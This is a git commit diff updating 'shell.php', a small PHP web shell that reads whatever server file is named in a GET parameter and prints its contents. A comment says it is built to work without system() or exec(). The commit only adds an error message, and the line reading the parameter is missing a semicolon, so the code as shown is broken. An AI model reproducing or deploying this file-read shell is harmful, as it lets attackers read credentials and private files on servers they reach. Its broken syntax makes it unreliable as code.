b67c0fd67a25ddd1552edafa462d288b438db11a
Migwe101 <105769844+Migden@users.noreply.github.com>
2025-05-01 06:47:21 +1000

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,7 +1,7 @@
 <?php 
 //Can't utilise direct shell interaction such as system(), exec(), shell_exec()
 $filename = $_GET['file']
-$file = fopen($filename, 'r');
+$file = fopen($filename, "r") or die("Can't Open File, or File does not exist!");
 echo fread($file,filesize($filename));
 fclose($file);
 ?>
